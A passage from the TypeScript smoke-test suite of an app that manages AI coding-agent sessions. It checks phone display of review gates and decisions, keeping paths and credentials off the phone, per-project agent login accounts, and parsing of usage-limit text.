    const phoneWaiting = phoneWire.tasks.find((task) => task.kind === 'verify');
    // 'blocked' is two situations in one word — a prerequisite that failed, and
    // one that has not finished yet — and the operator's next move differs.
    // Flattening them on the phone sends someone looking for a broken task when
    // the graph is merely queued, or leaves them waiting on one that will never
    // finish because nobody reopened the task above it.
    check(phoneHeld?.hold === 'prerequisite-failed' && phoneHeld.waitsOn.some((prereq) => prereq.status === 'failed')
      && phoneWaiting?.hold === 'prerequisite-unfinished' && phoneWaiting.waitsOn.every((prereq) => prereq.status !== 'failed'),
    "the phone tells a task held by a failed prerequisite apart from one whose prerequisite has not finished, naming each prerequisite with its own status rather than sending 'blocked' twice",
    `${phoneHeld?.hold} / ${phoneWaiting?.hold}`);
    // A null base commit has several causes this process cannot tell apart, so
    // it crosses as an absence — never '' and never a guessed cause. A long
    // objective is bounded with the remainder counted, because a paragraph cut
    // to fit reads exactly like a paragraph that ended.
    check(phoneGoals.mobileGoal({ ...phoneRecord, baseCommit: null }).baseCommit === null
      && phoneWire.objective.omitted === 2_800,
    'a goal with no base commit crosses to the phone as an absence rather than a diagnosis, and a long objective says how much of it stayed on the Mac',
    `${phoneWire.objective.text.length} characters sent, ${phoneWire.objective.omitted} left behind`);
    // Asserted against a record deliberately carrying a worktree, a session id
    // and a conversation id: those fields are null on a goal whose tasks never
    // launched, and an assertion over nulls would prove nothing.
    const phoneLeaky = phoneGoals.mobileGoal({
      ...phoneRecord,
      nodes: phoneRecord.nodes.map((node) => ({ ...node, worktree: path.join(controlRepo, 'worktree'), sessionId: 's_phone_leak' })),
      checkpoints: [{ id: 'ck_phone', docketId: phoneRecord.id, nodeId: phonePlan.id, sessionId: 's_phone_leak',
        conversationId: 'conversation-PHONE-GOAL-LEAK', repoCommit: 'abc1234567', worktree: path.join(controlRepo, 'worktree'),
        note: 'Handoff saved.', createdAt: Date.now() }],
    });
    const phoneLeakyJson = JSON.stringify(phoneLeaky);
    check(!phoneLeakyJson.includes(controlRepo) && !phoneLeakyJson.includes('src/phone-goal-claim.ts')
      && !phoneLeakyJson.includes('conversation-') && phoneLeaky.checkpoints[0]?.thread === true
      && phoneWire.claimsHeld === 1,
    'no absolute path, claimed path or conversation id reaches the phone with a goal — it is told that a claim is held and that a thread exists, and nothing that names either',
    phoneLeakyJson.slice(0, 240));

    /* ── the decision this phone can record, and the gate in front of it ── */
    // The gate reading and control.ts's approval rule read the same proofs, so
    // the two must never disagree: a phone showing a pass over work the Mac
    // would refuse to approve is the whole failure this screen exists to stop.
    const phoneDecide = control.createDocket({ projectId: controlProject.id, title: 'Phone decision',
      objective: 'Record the human review decision from a paired device.',
      acceptance: ['The gate result is on screen before the verdict is.'], risk: 'low' });
    const decideRead = () => control.docket(phoneDecide.id);
    const decidePlan = phoneDecide.nodes.find((node) => node.kind === 'plan')!;
    const decideImplement = phoneDecide.nodes.find((node) => node.kind === 'implement')!;
    const decideVerify = phoneDecide.nodes.find((node) => node.kind === 'verify')!;
    const decideReview = phoneDecide.nodes.find((node) => node.kind === 'review')!;
    const blockedDecision = phoneGoals.mobileGoalDecision(decideRead());
    check(blockedDecision.awaiting === false && /have not finished/.test(blockedDecision.refusal ?? '')
      && blockedDecision.unfinished.length > 0
      && phoneGoals.mobileGoalGate(decideRead()).state === 'not-run',
    'a phone is refused a decision on a review whose upstream tasks have not finished, in a sentence naming that state, and a gate nobody has run reads as not run rather than as nothing being wrong',
    `${blockedDecision.refusal} / ${phoneGoals.mobileGoalGate(decideRead()).state}`);

    control.completeNode(decidePlan.id, { detail: 'Planned.' });
    control.completeNode(decideImplement.id, { detail: 'Implemented.' });
    review.saveRecipe(controlProject.id, ['false']);
    await control.runProof(decideVerify.id);
    const redGate = phoneGoals.mobileGoalGate(decideRead());
    review.saveRecipe(controlProject.id, ['true']);
    await control.runProof(decideVerify.id);
    const greenGate = phoneGoals.mobileGoalGate(decideRead());
    check(redGate.state === 'failed' && redGate.unproven.includes(decideVerify.title)
      && /Review gate failed/.test(redGate.tasks[0]?.summary?.text ?? '')
      && greenGate.state === 'passed' && greenGate.unproven.length === 0,
    "the phone reads the review gate out of the goal's own proofs, naming the verification task it failed on in the Mac's own sentence, and the newest run decides rather than any historical pass",
    `${redGate.state} → ${greenGate.state}`);

    control.completeNode(decideVerify.id, { detail: 'Gate passed.' });
    const readyDecision = phoneGoals.mobileGoalDecision(decideRead());
    check(readyDecision.awaiting === true && readyDecision.nodeId === decideReview.id
      && readyDecision.refusal === null
      && phoneGoals.mobileGoal(decideRead()).decision.nodeId === decideReview.id,
    'once its prerequisites are complete the review task is the one thing the phone may decide, and the only node id that crosses to the device is that task',
    readyDecision.nodeId);

    // The one that matters: a gate that goes red under a screen already showing
    // a ready review. The phone must report the failure, and the Mac must refuse
    // the approval — a disagreement here is an approval nobody could audit.
    review.saveRecipe(controlProject.id, ['false']);
    await control.runProof(decideVerify.id);
    const redUnderReady = phoneGoals.mobileGoalGate(decideRead());
    const stillAwaiting = phoneGoals.mobileGoalDecision(decideRead()).awaiting;
    let approvalRefusal = '';
    try { control.completeNode(decideReview.id, { decision: 'approve' }); }
    catch (error) { approvalRefusal = error instanceof Error ? error.message : String(error); }
    review.saveRecipe(controlProject.id, ['true']);
    await control.runProof(decideVerify.id);
    check(redUnderReady.state === 'failed' && stillAwaiting === true
      && /Still unproven/.test(approvalRefusal) && approvalRefusal.includes(decideVerify.title)
      && phoneGoals.mobileGoalDecision(decideRead()).awaiting === true,
    "the phone's gate reading and control.ts's approval rule never disagree: a gate that went red under a ready review is reported as failed, the decision is still offered, and the Mac refuses the approval in its own words — naming the verification task and writing nothing",
    approvalRefusal);

    control.completeNode(decideReview.id, {
      detail: `${phoneGoals.MOBILE_GOAL_DECISION_NOTE.prefix}Read the diff on the train.`,
      decision: 'approve',
    });
    const decided = decideRead();
    const decidedWire = phoneGoals.mobileGoal(decided);
    check(decidedWire.status === 'accepted' && decidedWire.decision.awaiting === false
      && /already been decided/.test(decidedWire.decision.refusal ?? '')
      && decided.nodes.find((node) => node.id === decideReview.id)?.detail
        === 'From the paired phone: Read the diff on the train.'
      && decided.proofs.some((proof) => proof.kind === 'decision' && /Human decision: approve/.test(proof.summary)),
    'a decision recorded from the phone is the desktop decision — the goal is accepted, the record carries the note saying which device made it, and a second tap on a stale screen is refused with the state the task is actually in',
    `${decidedWire.status} / ${decidedWire.decision.refusal}`);

    const goalsRoute = sourceOf('src/main/mobile/goals.ts');
    const goalsScreen = sourceOf('src/main/mobile/page/sections/goals.ts');
    check(goalsScreen.includes(phoneGoals.MOBILE_GOAL_DECISION_NOTE.prefix)
      && goalsScreen.includes(phoneGoals.MOBILE_GOAL_DECISION_NOTE.alone)
      && goalsScreen.indexOf("card.append(goalGateBlock(") < goalsScreen.indexOf("node('div', 'goal-decide-acts')")
      && goalsScreen.includes('Gate not run') && goalsScreen.includes('Wanigan Settings'),
    'the screen shows the exact note the Mac will store, draws the gate result above the verdict buttons rather than below them, and has words for a gate nobody ran and for the setting that is switched off',
    goalsScreen.indexOf("card.append(goalGateBlock("));

    // The negative. The decision widened what a paired device may write; it must
    // not have widened what it may see. No route in this module asks for the one
    // scope that can put a file path on this wire, and no path, worktree,
    // session or conversation id rides along with a gate result or a decision.
    const decidedJson = JSON.stringify(decidedWire);
    // The bare declaration line, not the substring: both files discuss
    // `scope: 'repo'` in prose about why they do not use it.
    check(!/^\s*scope: 'repo',\s*$/m.test(goalsRoute)
      && !decidedJson.includes(controlRepo) && !decidedJson.includes('conversation-')
      && !/"worktree"|"sessionId"|"claimPath"/.test(decidedJson)
      && goalsRoute.includes("path: '/api/goal',\n  method: 'POST',\n  scope: 'control',"),
    "recording a decision is a control-scope write and nothing more: the goals routes still claim no repo scope, and no path, worktree, session id or conversation id reaches the phone with a gate result or a decision",
    decidedJson.slice(0, 240));
    // ── P32 · agent accounts ─────────────────────────────────────────────
    // An account is a labelled config directory, never a credential Wanigan
    // holds. These assertions cover the boundary rules; the browser sign-in
    // that puts a login in the directory is the operator's, not Wanigan's.
    const seeded = accounts.list('claude-code');
    const ambientConfig = process.env.CLAUDE_CONFIG_DIR?.trim();
    check(seeded.length === 1 && seeded[0].adopted && seeded[0].isDefault
      && seeded[0].configDir === (ambientConfig ? path.resolve(ambientConfig) : path.join(os.homedir(), '.claude')),
      'the operator’s existing configuration directory is adopted as the default account, not replaced', seeded[0]);
    check(!accounts.supportsAccounts('generic-cli') && accounts.configEnvVar('claude-code') === 'CLAUDE_CONFIG_DIR',
      'accounts exist only for a harness whose configuration directory Wanigan knows how to point');

    const workDir = path.join(dataDir(), 'claude-work-smoke');
    const refusedDir = (dir: string) => {
      try { accounts.create({ harness: 'claude-code', label: 'Bad', configDir: dir }); return false; } catch { return true; }
    };
    check(refusedDir('/etc/wanigan-smoke') && refusedDir('relative/path') && refusedDir(os.homedir()),
      'an account directory outside the owned roots, relative, or home itself is refused in the main process');

    const work = accounts.create({ harness: 'claude-code', label: 'Work', configDir: workDir });
    check(work.label === 'Work' && !work.isDefault && work.present && work.signedIn === 'unknown',
      'a new account directory is created and present, with no evidence of a login', work);
    fs.writeFileSync(`${workDir}.json`, '{"seen":true}');
    check(accounts.byId(work.id)?.signedIn === 'yes',
      'the sibling state file counts as evidence of a login — it sits beside the directory, not inside it');
    fs.rmSync(`${workDir}.json`);
    check((fs.statSync(workDir).mode & 0o777) === 0o700,
      'the directory a credential file lands in is created owner-only');
    let duplicateRefused = false;
    try { accounts.create({ harness: 'claude-code', label: 'Same dir', configDir: workDir }); } catch { duplicateRefused = true; }
    check(duplicateRefused, 'two accounts cannot share one directory, because they would share one login');

    check(accounts.launchEnv(work).CLAUDE_CONFIG_DIR === workDir && Object.keys(accounts.launchEnv(null)).length === 0,
      'an account contributes exactly the config-directory variable the harness reads');
    // Setting the variable to the platform default is not a no-op: Claude Code
    // then reads its state from inside the directory rather than beside it, and
    // reports a signed-in operator as logged out.
    const defaultDirAccount = { ...work, configDir: path.join(os.homedir(), '.claude') };
    check(Object.keys(accounts.launchEnv(defaultDirAccount)).length === 0,
      'the account that is the platform default sets no variable, because setting it to the default breaks the login it names');

    // Seeding: authored configuration is a convenience, a login is not, and a
    // transcript of everything said is not either.
    const sourceDir = path.join(dataDir(), 'claude-seed-source');
    fs.mkdirSync(path.join(sourceDir, 'skills', 'demo'), { recursive: true });
    fs.mkdirSync(path.join(sourceDir, 'projects'), { recursive: true });
    fs.writeFileSync(path.join(sourceDir, 'settings.json'), '{"theme":"dark"}');
    fs.writeFileSync(path.join(sourceDir, 'skills', 'demo', 'SKILL.md'), '# demo\n');
    fs.writeFileSync(path.join(sourceDir, '.credentials.json'), '{"secret":"do-not-copy"}');
    fs.writeFileSync(path.join(sourceDir, 'projects', 'history.jsonl'), '{"said":"do-not-copy"}\n');
    const source = accounts.create({ harness: 'claude-code', label: 'Seed source', configDir: sourceDir });
    const seededDir = path.join(dataDir(), 'claude-seed-target');
    accounts.create({ harness: 'claude-code', label: 'Seeded', configDir: seededDir, seedFromAccountId: source.id });
    check(fs.existsSync(path.join(seededDir, 'settings.json'))
      && fs.existsSync(path.join(seededDir, 'skills', 'demo', 'SKILL.md')),
      'a new account can be seeded with authored configuration, so it does not start empty');
    check(!fs.existsSync(path.join(seededDir, '.credentials.json')) && !fs.existsSync(path.join(seededDir, 'projects')),
      'seeding never copies a stored login or the conversation history — separating those is the whole point');
    check(!fs.lstatSync(path.join(seededDir, 'skills')).isSymbolicLink(),
      'seeded configuration is copied, not linked, so deleting one account cannot reach into the other');
    accounts.remove(source.id);
    accounts.remove(accounts.list('claude-code').find((row) => row.label === 'Seeded')!.id);

    const personal = seeded[0];
    const byDefault = accounts.resolve({ harness: 'claude-code', projectId: controlProject.id });
    check(byDefault.account?.id === personal.id && byDefault.source === 'default',
      'a launch with no choice resolves to the default account and says that is where the answer came from');
    accounts.setProjectAccount(controlProject.id, 'claude-code', work.id);
    const byProject = accounts.resolve({ harness: 'claude-code', projectId: controlProject.id });
    check(byProject.account?.id === work.id && byProject.source === 'project',
      'a project’s saved account beats the default, and the source is reported rather than guessed');
    const byExplicit = accounts.resolve({ harness: 'claude-code', projectId: controlProject.id, explicitAccountId: personal.id });
    check(byExplicit.account?.id === personal.id && byExplicit.source === 'explicit',
      'a per-launch choice beats the project’s saved account');
    // The follow option is the ABSENCE of a choice, so its label has to come
    // from a resolution asked with no choice in it. Reading it back off the
    // current selection is how the dialog came to call an explicitly picked
    // account "the default" — false twice over right here, where the fallback
    // is the project's account and the pick is the default one.
    check(byProject.source === 'project' && byExplicit.source === 'explicit'
      && byProject.account?.id !== byExplicit.account?.id,
    'what a launch falls back to and what the operator picked are two questions with two different answers');
    const accountDialogSrc = sourceOf('src/renderer/src/components/NewSessionDialog.tsx');
    check(/resolveForLaunch\(providerId, projectId \|\| null, null\)/.test(accountDialogSrc)
      && /\{followRes\?\.account/.test(accountDialogSrc)
      && /followRes\.source === 'project' \? 'this project' : 'your default'/.test(accountDialogSrc)
      && !/Follow \$\{accountRes/.test(accountDialogSrc)
      && /accountRes\.source === 'explicit' \? ' — chosen for this session only\./.test(accountDialogSrc),
    'the follow option is labelled from a no-choice resolution, and an explicitly chosen account reads as chosen rather than as the default');

    check(accounts.resolve({ harness: 'generic-cli', projectId: controlProject.id }).account === null
      && !accounts.supportsAccounts('generic-cli'),
    'a harness with no known configuration directory offers no accounts instead of pretending');

    // Codex accounts are CODEX_HOME directories: the same labelled-directory
    // shape, a different login file, and an honest list of what a new one lacks.
    const codexSeeded = accounts.list('codex');
    check(accounts.supportsAccounts('codex') && accounts.configEnvVar('codex') === 'CODEX_HOME'
      && codexSeeded.length >= 1 && codexSeeded.some((row) => row.adopted && row.isDefault),
    'Codex is an account-capable harness whose ambient or default home is adopted as the default account', codexSeeded);
    const codexWorkDir = path.join(dataDir(), 'codex-work-smoke');
    const codexWork = accounts.create({ harness: 'codex', label: 'Codex work', configDir: codexWorkDir });
    check(codexWork.present && codexWork.signedIn === 'unknown' && accounts.launchEnv(codexWork).CODEX_HOME === codexWorkDir,
      'a new Codex account directory contributes CODEX_HOME and, with no auth.json, reports no login evidence', codexWork);
    fs.writeFileSync(path.join(codexWorkDir, 'auth.json'), '{"tokens":"present"}');
    check(accounts.byId(codexWork.id)?.signedIn === 'yes',
      'Codex login evidence is auth.json inside the home — evidence of use, not proof of a valid login');
    check(accounts.startsWithout('codex').some((line) => /config\.toml/.test(line))
      && accounts.startsWithout('codex').some((line) => /login/.test(line)),
    'a fresh Codex directory is described as starting without config, MCP servers, skills or a login');
    check(accounts.appliesTo({ harness: 'codex', backendId: 'openai' }, false) === undefined
      && accounts.appliesTo({ harness: 'claude-code', backendId: 'anthropic' }, false) === true
      && accounts.appliesTo({ harness: 'claude-code', backendId: 'anthropic' }, true) === false
      && accounts.appliesTo({ harness: 'claude-code', backendId: 'zai' }, false) === false,
    'whether an account applies is decided per harness: Codex homes apply whatever the backend, Claude accounts only for un-redirected Anthropic profiles');
    check(accounts.byConfigDir('codex', codexWorkDir)?.id === codexWork.id && accounts.byConfigDir('codex', path.join(dataDir(), 'nowhere')) === null,
      'a Codex home resolves back to its account only when Wanigan knows that directory as one');
    accounts.remove(codexWork.id);
    // The phone names the account each session is signed in as: an operator
    // with a work login and a personal one cannot tell two rows apart without
    // it. Three readings, because they are three different facts — the account
    // a session has, never having had one, and one Wanigan no longer has.
    const phoneRows = mobileFleetSnapshot([
      { ...quiet, id: 's_smoke_phone_work', accountId: work.id, accountLabel: work.label },
      { ...quiet, id: 's_smoke_phone_none' },
      { ...quiet, id: 's_smoke_phone_gone', accountId: 'acct_removed_smoke', accountLabel: 'Gone' },
    ], [], {}).sessions;
    const phoneAccount = (id: string) => phoneRows.find((row) => row.id === id)?.account;
    check(phoneAccount('s_smoke_phone_work')?.label === 'Work'
      && phoneAccount('s_smoke_phone_work')?.id === work.id,
    'the phone names the account each session is signed in as, by label', phoneAccount('s_smoke_phone_work'));
    check(phoneAccount('s_smoke_phone_none')?.label === 'No account'
      && phoneAccount('s_smoke_phone_none')?.id === null,
    'a session that never had an account reads as none, not as a blank label', phoneAccount('s_smoke_phone_none'));
    check(phoneAccount('s_smoke_phone_gone')?.label === 'Removed account'
      && phoneAccount('s_smoke_phone_gone')?.id === 'acct_removed_smoke',
    'and an account since removed reads as removed rather than as the label it carried at launch', phoneAccount('s_smoke_phone_gone'));
    const phoneAccountJson = JSON.stringify(phoneRows);
    check(!phoneAccountJson.includes(work.configDir) && !phoneAccountJson.includes(dataDir())
      && !phoneAccountJson.includes('CLAUDE_CONFIG_DIR') && !phoneAccountJson.includes('Gone'),
    'and an account crosses to the phone as an identity only — never the config directory that selects the login',
    phoneAccountJson);
    // ── the phone chooses the login too ──────────────────────────────────
    // Starting work from the iPad took whatever the project or the app default
    // resolved to, with no way to say "the work login, not the personal one"
    // and no way to see which one it would be. The half that is easy to get
    // wrong is the option meaning "I did not choose": it has to name the
    // FALLBACK, which here is the account this project is pinned to and not the
    // default at all — the same sentence the desktop dialog got wrong until it
    // started asking for a second, choice-free resolution.
    const phoneLaunch = await import('./mobile/launch-options');
    const phoneAccounts = phoneLaunch.mobileAccountOffer('claude', [controlProject.id]);
    const phoneFollow = phoneAccounts.follow.find((row) => row.projectId === controlProject.id);
    check(phoneAccounts.supported
      && [...phoneAccounts.choices.map((row) => row.id)].sort().join() === [personal.id, work.id].sort().join()
      && phoneFollow?.accountId === work.id && phoneFollow?.source === 'project',
    'the phone offers both logins, and the option that means no choice names the account this project would actually resolve to rather than “the default”',
    phoneFollow);
    const phoneGlmAccounts = phoneLaunch.mobileAccountOffer('glm', [controlProject.id]);
    check(!phoneGlmAccounts.supported && phoneGlmAccounts.choices.length === 0
      && phoneGlmAccounts.follow.length === 0
      && (phoneGlmAccounts.reason ?? '').includes('another vendor'),
    'a profile that authenticates against another vendor offers the phone no account either, and says why instead of drawing an empty picker',
    phoneGlmAccounts.reason);
    const phoneAccountRefusal = (providerId: string, accountId: string): string => {
      try { phoneLaunch.resolveMobileLaunchAccount(providerId, accountId); return ''; }
      catch (error) { return error instanceof Error ? error.message : String(error); }
    };
    const phoneCodexAccount = accounts.list('codex')[0]?.id ?? '';
    check(phoneAccountRefusal('claude', 'acct_not_a_real_account').includes('no longer exists')
      && phoneAccountRefusal('claude', phoneCodexAccount).includes('different harness')
      && phoneAccountRefusal('glm', work.id).includes('another vendor')
      && phoneLaunch.resolveMobileLaunchAccount('claude', work.id) === work.id
      && phoneLaunch.resolveMobileLaunchAccount('claude', '') === null,
    'an account id from a phone is checked against the real account list: unknown, belonging to another harness, or named for a profile with no account decision are all refused rather than falling back to the default — and no choice at all stays no choice',
    phoneAccountRefusal('claude', 'acct_not_a_real_account'));
    const phoneAccountsJson = JSON.stringify(phoneAccounts);
    check(!phoneAccountsJson.includes(work.configDir) && !phoneAccountsJson.includes(personal.configDir)
      && !phoneAccountsJson.includes('configDir') && !phoneAccountsJson.includes('CLAUDE_CONFIG_DIR')
      && !phoneAccountsJson.includes(os.homedir()) && !phoneAccountsJson.includes(dataDir()),
    'an account reaches the phone as an id and a label only — never the config directory that selects the login',
    phoneAccountsJson);
    const priorPhoneKey = process.env.ANTHROPIC_API_KEY;
    process.env.ANTHROPIC_API_KEY = 'sk-ant-phone-smoke';
    const phoneOverridden = phoneLaunch.mobileAccountOffer('claude', [controlProject.id]);
    if (priorPhoneKey === undefined) delete process.env.ANTHROPIC_API_KEY;
    else process.env.ANTHROPIC_API_KEY = priorPhoneKey;
    check(phoneOverridden.override === 'ANTHROPIC_API_KEY'
      && !JSON.stringify(phoneOverridden).includes('sk-ant-phone-smoke'),
    'the phone is told by name that an exported credential outranks the account it is picking, and the value of that credential never leaves the Mac',
    phoneOverridden.override);
    // ── the phone pins the login to the repository ───────────────────────
    // Choosing an account for one launch already worked from a phone; making
    // the choice stick to a repository meant walking to the Mac. The half that
    // has to be exactly right is that there is still only ONE record of which
    // login a repository uses — two of them is not a stale screen, it is a
    // commit authored by the wrong person.
    const phonePin = phoneLaunch.mobileAccountOffer('claude', [controlProject.id])
      .follow.find((row) => row.projectId === controlProject.id);
    check(phonePin?.pinnedAccountId === work.id && phonePin?.accountId === work.id
      && phonePin?.fallbackAccountId === personal.id && phonePin?.fallbackLabel === personal.label,
    'the phone is told which account a project is pinned to and, separately, what clearing that pin would restore — one answer cannot stand in for the other, or a screen would offer to “correct” a project that never expressed a preference and would stop following the default the day it changes',
    phonePin);
    const phonePinned = phoneLaunch.setMobileProjectAccount({
      projectId: controlProject.id, providerId: 'claude', accountId: personal.id,
    });
    check(accounts.projectAccount(controlProject.id, 'claude-code')?.id === personal.id
      && phonePinned.follow.pinnedAccountId === personal.id && phonePinned.follow.source === 'project',
    'a pin set from a phone is written to the one record the desktop panel and the launch resolver already read, rather than to a second place a repository’s login could live',
    accounts.projectAccount(controlProject.id, 'claude-code')?.id);
    const phoneCleared = phoneLaunch.setMobileProjectAccount({
      projectId: controlProject.id, providerId: 'claude', accountId: null,
    });
    check(accounts.projectAccount(controlProject.id, 'claude-code') === null
      && phoneCleared.follow.pinnedAccountId === null && phoneCleared.follow.source === 'default'
      && phoneCleared.follow.accountId === phoneCleared.follow.fallbackAccountId,
    'clearing the pin from a phone deletes the saved choice instead of writing today’s default into it, so the project follows the default again when the default changes',
    phoneCleared.follow);
    const phonePinRefusal = (projectId: string, providerId: string, accountId: string | null): string => {
      try { phoneLaunch.setMobileProjectAccount({ projectId, providerId, accountId }); return ''; }
      catch (error) { return error instanceof Error ? error.message : String(error); }
    };
    check(phonePinRefusal('prj_not_a_real_project', 'claude', work.id).includes('not one this Mac has')
      && phonePinRefusal(controlProject.id, 'not_a_real_provider', work.id).includes('not installed')
      && phonePinRefusal(controlProject.id, 'claude', 'acct_not_a_real_account').includes('no longer exists')
      && phonePinRefusal(controlProject.id, 'claude', phoneCodexAccount).includes('different harness')
      && phonePinRefusal(controlProject.id, 'glm', work.id).includes('another vendor')
      && accounts.projectAccount(controlProject.id, 'claude-code') === null,
    'an unknown project, an uninstalled profile, an account that no longer exists, an account belonging to another harness and a profile that authenticates elsewhere are five refusals with five sentences — and the stored pin is left exactly as it was, never silently written to something that does not exist',
    phonePinRefusal(controlProject.id, 'claude', 'acct_not_a_real_account'));
    const phonePinJson = JSON.stringify(phonePinned);
    check(!phonePinJson.includes(work.configDir) && !phonePinJson.includes(personal.configDir)
      && !phonePinJson.includes('configDir') && !phonePinJson.includes('CLAUDE_CONFIG_DIR')
      && !phonePinJson.includes(controlRepo) && !phonePinJson.includes(os.homedir())
      && !phonePinJson.includes(dataDir()),
    'setting which identity a repository’s agents sign in as answers with ids and labels only — never the config directory that selects the login, never the repository path, and never the name of the variable that points at it',
    phonePinJson);
    // The sentence the phone prints — "this applies to the next session" — is
    // only worth printing if the code behaves that way. sessions.ts resolves the
    // account once at spawn and freezes it onto the row, so a pin changed
    // afterwards must not reach it.
    const pinStamp = Date.now();
    const pinFrozenRow = `s_pin_frozen_${pinStamp}`;
    db().prepare(`INSERT INTO session_log (id, provider_id, harness_id, project_id, project_path, project_name, started_at, account_id)
      VALUES (?,?,?,?,?,?,?,?)`).run(pinFrozenRow, 'claude', 'claude-code', controlProject.id, controlRepo, 'control', pinStamp, personal.id);
    try {
      phoneLaunch.setMobileProjectAccount({ projectId: controlProject.id, providerId: 'claude', accountId: work.id });
      const frozen = db().prepare('SELECT account_id FROM session_log WHERE id=?')
        .get(pinFrozenRow) as { account_id: string | null };
      check(frozen.account_id === personal.id
        && accounts.projectAccount(controlProject.id, 'claude-code')?.id === work.id,
      'changing the pin from a phone does not reach a session that already started — the account is resolved once at spawn and frozen onto the row — so the screen’s promise that a change applies to the next session is what the code actually does',
      frozen.account_id);
    } finally {
      db().prepare('DELETE FROM session_log WHERE id=?').run(pinFrozenRow);
    }
    // A counted zero and an unread fleet are different answers. Only the first
    // may be printed as a claim about what is running.
    phoneLaunch.configureMobileLaunchPinSource(null);
    const phoneUncounted = phoneLaunch.setMobileProjectAccount({
      projectId: controlProject.id, providerId: 'claude', accountId: work.id,
    });
    phoneLaunch.configureMobileLaunchPinSource({
      liveProjectIds: () => [controlProject.id, controlProject.id, 'prj_somewhere_else'],
    });
    const phoneCounted = phoneLaunch.setMobileProjectAccount({
      projectId: controlProject.id, providerId: 'claude', accountId: work.id,
    });
    phoneLaunch.configureMobileLaunchPinSource(null);
    check(phoneUncounted.runningSessions === null && phoneCounted.runningSessions === 2,
      'how many sessions were already running is counted at the moment of the write, and is null rather than zero when nothing answered — the screen makes a liveness claim only from a number something actually produced',
      [phoneUncounted.runningSessions, phoneCounted.runningSessions]);
    // GLM runs the reviewed Claude harness but bills another vendor, and its
    // environment is empty until a key is stored — so the runtime environment
    // alone cannot answer this. The declared backend can.
    check(providers.usesAnthropicAccount({ harness: 'claude-code', backendId: 'anthropic' })
      && !providers.usesAnthropicAccount({ harness: 'claude-code', backendId: 'zai' })
      && !providers.usesAnthropicAccount({ harness: 'claude-code', backendId: 'deepseek' })
      && !providers.usesAnthropicAccount({ harness: 'codex', backendId: 'openai' }),
      'whether a profile signs in with a Claude account is keyed on its declared backend, not on a key it happens to have stored');
    const redirected = accounts.resolve({ harness: 'claude-code', projectId: controlProject.id, appliesToAnthropic: false });
    check(redirected.account === null && (redirected.reason ?? '').includes('another vendor'),
      'a profile that redirects the Anthropic API gets no Claude account, because it would name a login it never uses');

    const priorKey = process.env.ANTHROPIC_API_KEY;
    process.env.ANTHROPIC_API_KEY = 'sk-ant-smoke';
    const overridden = accounts.resolve({ harness: 'claude-code', projectId: controlProject.id });
    if (priorKey === undefined) delete process.env.ANTHROPIC_API_KEY; else process.env.ANTHROPIC_API_KEY = priorKey;
    check(overridden.override === 'ANTHROPIC_API_KEY' && overridden.account !== null,
      'an ambient API key outranks the stored login, and the resolution says so rather than showing a choice the session ignores');

    let defaultRemovalRefused = false;
    try { accounts.remove(personal.id); } catch { defaultRemovalRefused = true; }
    check(defaultRemovalRefused, 'the default account cannot be removed while another account would be left without one');

    // A resumed conversation continues under the account that recorded it.
    // Decided from the row in main; the renderer's picker cannot override it.
    const resumeStamp = Date.now();
    const ownedRow = `s_resume_owned_${resumeStamp}`;
    const unknownRow = `s_resume_unknown_${resumeStamp}`;
    const resumeInsert = db().prepare(`INSERT INTO session_log (id, provider_id, harness_id, project_id, project_path, project_name, started_at, account_id)
      VALUES (?,?,?,?,?,?,?,?)`);
    resumeInsert.run(ownedRow, 'claude', 'claude-code', controlProject.id, controlRepo, 'control', resumeStamp, work.id);
    resumeInsert.run(unknownRow, 'claude', 'claude-code', controlProject.id, controlRepo, 'control', resumeStamp, null);
    try {
      const pinned = resumeAccountFor(ownedRow, 'claude-code', null);
      check(pinned.accountId === work.id && pinned.note === null,
        'resuming pins the account the conversation was recorded under, as if chosen explicitly');
      const same = resumeAccountFor(ownedRow, 'claude-code', work.id);
      check(same.accountId === work.id, 'asking for the owning account is not a conflict');
      let otherAccountRefused = '';
      try { resumeAccountFor(ownedRow, 'claude-code', personal.id); }
      catch (e) { otherAccountRefused = e instanceof Error ? e.message : String(e); }
      check(otherAccountRefused.includes('“Work”') && /may not find/.test(otherAccountRefused),
        'asking to resume under a different account is refused by label and says the CLI may not find the conversation, not that it will', otherAccountRefused);
      const unknown = resumeAccountFor(unknownRow, 'claude-code', null);
      check(unknown.accountId === null && /unknown/.test(unknown.note ?? ''),
        'a row recorded before accounts existed proceeds and says the launch account is unknown', unknown);
      check(resumeAccountFor(ownedRow, 'generic-cli', 'anything').accountId === 'anything'
        && resumeAccountFor(ownedRow, 'generic-cli', 'anything').note === null,
      'a harness without accounts passes the request through untouched');
      accounts.remove(work.id);
      let removedRefused = '';
      try { resumeAccountFor(ownedRow, 'claude-code', null); }
      catch (e) { removedRefused = e instanceof Error ? e.message : String(e); }
      check(removedRefused.includes(work.id) && /no longer has/.test(removedRefused) && /will not guess/.test(removedRefused),
        'a conversation whose account was removed is refused with the account named, not resumed under a guess', removedRefused);
    } finally {
      db().prepare('DELETE FROM session_log WHERE id IN (?,?)').run(ownedRow, unknownRow);
    }
    const forgotten = accounts.byId(work.id) ? accounts.remove(work.id) : { removed: true, configDir: workDir };
    check(forgotten.removed && fs.existsSync(workDir),
      'forgetting an account leaves its directory on disk; Wanigan cannot put back a login it deletes');
    check(accounts.list('claude-code').length === 1 && !accounts.projectAccount(controlProject.id, 'claude-code'),
      'removing an account also clears the project mappings that pointed at it');

    // ── P33 · limits parsing ─────────────────────────────────────────────
    // The reply is human text, so the parser is the risk. It must read the real
    // shape exactly and refuse anything it does not recognise, because a format
    // change reported as "0% used" is worse than no screen at all.
    const realUsageReply = [
      'You are currently using your subscription to power your Claude Code usage',
      '',
      'Current session: 5% used · resets Sep 4 at 1:29pm (America/Chicago)',
      'Current week (all models): 79% used · resets Sep 6 at 8:59pm (America/Chicago)',
      'Current week (Fable): 100% used · resets Sep 6 at 8:59pm (America/Chicago)',
      '',
      "What's contributing to your limits usage?",
      'Approximate, based on local sessions on this machine — does not include other devices or claude.ai.',
      '',
      'Last 24h · 2,857 requests · 7 sessions',
      '  95% of your usage was at >150k context',
      '  Top skills: /claude-api 1%',
      '',
      'Last 7d · 17032 requests · 32 sessions',
      '  83% of your usage was at >150k context',
    ].join('\n');
    const parsedUsage = claudeLimits.__test.parseUsage(realUsageReply);
    check(parsedUsage.windows.length === 3
      && parsedUsage.windows[0].kind === 'session' && parsedUsage.windows[0].usedPercent === 5
      && parsedUsage.windows[1].scope === null && parsedUsage.windows[1].usedPercent === 79
      && parsedUsage.windows[2].scope === 'Fable' && parsedUsage.windows[2].usedPercent === 100,
      'the three real limit windows parse, and "all models" is read as no model scope rather than a model called that',
      parsedUsage.windows);
